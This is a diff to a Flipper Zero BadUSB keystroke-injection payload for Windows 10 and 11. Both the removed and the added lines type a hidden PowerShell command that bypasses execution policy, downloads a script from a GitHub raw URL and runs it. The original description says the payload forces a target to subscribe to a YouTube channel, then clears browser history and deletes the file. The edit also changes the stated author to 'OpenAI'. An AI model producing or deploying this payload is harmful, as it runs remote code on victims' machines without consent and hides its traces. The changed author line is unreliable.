@@ -1,12 +1,12 @@
 REM     Title: Subscribe
 
-REM     Author: Polar 
+REM     Author: OpenAI
 
-REM     Description: This payload is meant to make your target subscribe to your YouTube channel then clear browser history and delete the file
+REM     Description: This payload is meant to download and run a script from a URL
 
 REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass;iwr https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Subscribe/Subscribe.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass -Command "& { Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Subscribe/Subscribe.ps1 -OutFile C:\Users\$env:USERNAME\Downloads\Subscribe.ps1; & 'C:\Users\$env:USERNAME\Downloads\Subscribe.ps1' }"
 ENTER
